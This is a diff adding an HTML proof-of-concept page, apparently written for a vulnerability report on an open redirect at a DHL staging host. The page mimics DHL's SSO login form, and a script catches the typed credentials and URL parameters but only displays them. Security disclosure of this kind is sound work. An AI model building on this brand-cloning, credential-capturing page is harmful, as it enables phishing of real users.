@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>DHL SSO - Central Authentication Service</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      font-family: Arial, sans-serif;
+      background: #FFCC00;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    header {
+      background: #FFCC00;
+      padding: 10px 20px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      border-bottom: 3px solid #D40511;
+    }
+
+    .dhl-logo {
+      font-size: 32px;
+      font-weight: 900;
+      color: #D40511;
+      letter-spacing: -1px;
+    }
+
+    .header-title {
+      font-size: 18px;
+      font-weight: bold;
+      color: #D40511;
+    }
+
+    .main {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 40px 20px;
+    }
+
+    .login-box {
+      background: white;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      padding: 30px;
+      width: 100%;
+      max-width: 420px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.15);
+    }
+
+    .login-box h2 {
+      color: #D40511;
+      font-size: 20px;
+      margin-bottom: 20px;
+      text-transform: uppercase;
+      border-bottom: 2px solid #D40511;
+      padding-bottom: 10px;
+    }
+
+    .notice {
+      background: #fff8e1;
+      border: 1px solid #ffc107;
+      border-radius: 3px;
+      padding: 10px 14px;
+      margin-bottom: 18px;
+      font-size: 13px;
+      color: #555;
+    }
+
+    .form-row {
+      display: flex;
+      align-items: center;
+      margin-bottom: 14px;
+    }
+
+    .form-row label {
+      width: 130px;
+      font-size: 13px;
+      font-weight: bold;
+      color: #333;
+      text-align: right;
+      padding-right: 12px;
+    }
+
+    .form-row input {
+      flex: 1;
+      padding: 6px 10px;
+      border: 1px solid #aaa;
+      border-radius: 2px;
+      font-size: 13px;
+      outline: none;
+    }
+
+    .form-row input:focus {
+      border-color: #D40511;
+    }
+
+    .btn-row {
+      display: flex;
+      gap: 10px;
+      margin-top: 20px;
+      justify-content: flex-start;
+    }
+
+    .btn {
+      padding: 8px 20px;
+      font-size: 13px;
+      font-weight: bold;
+      border: none;
+      border-radius: 2px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .btn-primary {
+      background: #D40511;
+      color: white;
+    }
+
+    .btn-azure {
+      background: #0078d4;
+      color: white;
+    }
+
+    .btn:hover { opacity: 0.9; }
+
+    .links {
+      margin-top: 18px;
+      font-size: 12px;
+    }
+
+    .links a {
+      color: #D40511;
+      text-decoration: none;
+      display: block;
+      margin-bottom: 4px;
+    }
+
+    /* PoC Banner — visible uniquement pour le rapport */
+    .poc-banner {
+      background: #d4edda;
+      border: 2px solid #28a745;
+      border-radius: 6px;
+      padding: 14px 18px;
+      margin: 20px;
+      font-size: 13px;
+      color: #155724;
+    }
+
+    .poc-banner strong {
+      font-size: 14px;
+      display: block;
+      margin-bottom: 6px;
+    }
+
+    .captured {
+      background: #fff3cd;
+      border: 1px solid #ffc107;
+      border-radius: 4px;
+      padding: 8px 12px;
+      margin-top: 8px;
+      font-family: monospace;
+      font-size: 12px;
+      color: #856404;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <div class="dhl-logo">DHL</div>
+    <div class="header-title">DHL SSO - Central Authentication Service</div>
+  </header>
+
+  <!-- PoC Banner — montre que l'utilisateur a été redirigé -->
+  <div class="poc-banner" id="pocBanner">
+    <strong>🔴 PROOF OF CONCEPT — Open Redirect Vulnerability</strong>
+    User was redirected from <strong>staging.spl-test.dhl.com</strong> to this attacker-controlled page.<br>
+    The user saw a legitimate DHL URL before being redirected here.<br>
+    <div class="captured" id="capturedData">
+      Captured from URL: <span id="urlParams"></span>
+    </div>
+  </div>
+
+  <div class="main">
+    <div class="login-box">
+      <h2>Login</h2>
+
+      <div class="notice">
+        Use Login Azure AD in case your account has been migrated.
+      </div>
+
+      <p style="font-size:13px;color:#555;margin-bottom:16px;">
+        You are not currently logged in. Please login to access the authorized content.
+      </p>
+
+      <form id="loginForm" onsubmit="captureCredentials(event)">
+        <div class="form-row">
+          <label for="username">Identifiant :</label>
+          <input type="text" id="username" name="username" autocomplete="off">
+        </div>
+        <div class="form-row">
+          <label for="password">Mot de passe :</label>
+          <input type="password" id="password" name="password">
+        </div>
+        <div class="btn-row">
+          <button type="submit" class="btn btn-primary">▶ SE CONNECTER</button>
+          <button type="button" class="btn btn-azure">▶ Login Azure AD</button>
+        </div>
+      </form>
+
+      <div class="links">
+        <a href="#">Change password</a>
+        <a href="#">Manage user details</a>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // Affiche les paramètres capturés depuis l'URL (ticket CAS si présent)
+    window.onload = function() {
+      var params = window.location.search;
+      if (params) {
+        document.getElementById('capturedData').style.display = 'block';
+        document.getElementById('urlParams').textContent = window.location.href;
+      }
+    };
+
+    // Pour le PoC — affiche les credentials saisis (ne pas utiliser en dehors du rapport)
+    function captureCredentials(e) {
+      e.preventDefault();
+      var u = document.getElementById('username').value;
+      var p = document.getElementById('password').value;
+      var banner = document.getElementById('pocBanner');
+      banner.innerHTML = '<strong>🔴 PoC — Credentials captured by attacker page:</strong><br>' +
+        'Username: <code>' + u + '</code><br>' +
+        'Password: <code>' + p + '</code><br><br>' +
+        '<em>In a real attack, these would be sent to the attacker\'s server.</em>';
+    }
+  </script>
+
+</body>
+</html>
